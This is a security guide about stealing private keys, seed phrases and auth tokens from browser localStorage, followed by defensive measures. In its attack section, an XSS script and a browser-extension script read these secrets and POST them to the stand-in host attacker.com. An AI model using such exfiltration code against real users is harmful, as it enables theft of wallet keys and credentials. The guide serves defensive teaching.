# Local Storage Theft Attack

## 📋 Attack Information
**Category**: Frontend Attack | **Severity**: 🔴 High (CVSS 7.5)

## 🎯 Attack Principle
Attacker exploits XSS or malicious extensions to steal sensitive data from localStorage/sessionStorage.

## 💀 Attack Vectors

### 1. XSS + localStorage
```javascript
// ❌ Storing private key in localStorage
localStorage.setItem('privateKey', privateKey);

// XSS attack:
<script>
  const privateKey = localStorage.getItem('privateKey');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ privateKey }),
  });
</script>
```

### 2. Malicious Browser Extension
```javascript
// Extension can read all localStorage
chrome.tabs.executeScript(tabId, {
  code: `
    const data = {
      privateKey: localStorage.getItem('privateKey'),
      seedPhrase: localStorage.getItem('mnemonic'),
      authToken: localStorage.getItem('auth_token'),
    };
    
    // Send to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data),
    });
  `
});
```

### 3. Physical Access
```javascript
// Attacker with physical access to computer
// Opens browser DevTools → Application → Local Storage
// Copies all sensitive data
```

## 🛡️ Defense Measures

### 1. Never Store Sensitive Data in localStorage
```typescript
// ❌ DANGEROUS
localStorage.setItem('privateKey', privateKey);
localStorage.setItem('mnemonic', mnemonic);

// ✅ SECURE: Use encrypted secure storage
import { SecureStore } from './services/storage/SecureStore';

// Hardware-encrypted storage (React Native)
await SecureStore.setToken('private_key', privateKey, 3600, true);

// Web: Use IndexedDB with encryption
```

### 2. Session-Only Storage
```typescript
// ✅ Use sessionStorage for temporary data
sessionStorage.setItem('temp_data', data);

// Cleared when browser/tab closes
// Not accessible to other tabs
```

### 3. Encryption
```typescript
/**
 * If must use localStorage, encrypt first
 */
import CryptoJS from 'crypto-js';

// Derive encryption key from user password
const encryptionKey = await deriveKey(userPassword);

// Encrypt before storing
const encrypted = CryptoJS.AES.encrypt(
  sensitiveData,
  encryptionKey
).toString();

localStorage.setItem('encrypted_data', encrypted);

// Decrypt when reading
const decrypted = CryptoJS.AES.decrypt(
  localStorage.getItem('encrypted_data'),
  encryptionKey
).toString(CryptoJS.enc.Utf8);
```

### 4. Clear on Logout
```typescript
/**
 * Clear all storage on logout
 */
async function logout() {
  // Clear localStorage
  localStorage.clear();
  
  // Clear sessionStorage
  sessionStorage.clear();
  
  // Clear secure storage
  await SecureStore.clear();
  
  // Clear memory
  privateKey = null;
  
  // Redirect to login
  navigate('/login');
}
```

### 5. Auto-Logout on Inactivity
```typescript
/**
 * Auto-logout after inactivity
 */
let inactivityTimer: NodeJS.Timeout;
const INACTIVITY_TIMEOUT = 15 * 60 * 1000; // 15 minutes

function resetInactivityTimer() {
  clearTimeout(inactivityTimer);
  
  inactivityTimer = setTimeout(() => {
    // Auto-logout
    logout();
    Alert.alert('Session Expired', 'Logged out due to inactivity');
  }, INACTIVITY_TIMEOUT);
}

// Reset timer on user activity
document.addEventListener('mousedown', resetInactivityTimer);
document.addEventListener('keypress', resetInactivityTimer);
document.addEventListener('touchstart', resetInactivityTimer);
```

### 6. Content Security Policy
```html
<!-- ✅ Prevent XSS that could read localStorage -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 7. Storage Monitoring
```typescript
/**
 * Detect unauthorized localStorage access
 */
function monitorStorage() {
  const originalSetItem = localStorage.setItem;
  const originalGetItem = localStorage.getItem;
  
  localStorage.setItem = function(key: string, value: string) {
    // Log access
    console.log('localStorage.setItem:', key);
    
    // Check if setting sensitive data
    if (['privateKey', 'mnemonic'].includes(key)) {
      console.error('❌ Attempting to store sensitive data in localStorage!');
      throw new Error('Cannot store sensitive data in localStorage');
    }
    
    return originalSetItem.call(this, key, value);
  };
  
  localStorage.getItem = function(key: string) {
    console.log('localStorage.getItem:', key);
    return originalGetItem.call(this, key);
  };
}
```

## ✅ What to Store Where

```typescript
// ✅ localStorage: Non-sensitive, public data
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
localStorage.setItem('lastVisited', Date.now());

// ✅ sessionStorage: Temporary, session-only
sessionStorage.setItem('currentTab', 'dashboard');

// ✅ Secure enclave: Sensitive data
await SecureStore.setItem('private_key', privateKey);
await SecureStore.setItem('auth_token', token);

// ❌ NEVER in localStorage/sessionStorage:
// - Private keys
// - Seed phrases  
// - Passwords
// - Auth tokens
// - API keys
```

## ✅ Best Practices

```
□ Never store sensitive data in localStorage
□ Use hardware-backed secure storage
□ Encrypt if must use localStorage
□ Clear storage on logout
□ Implement auto-logout
□ Use sessionStorage for temporary data
□ Implement CSP to prevent XSS
□ Monitor storage access in dev mode
```

**Created**: November 11, 2025

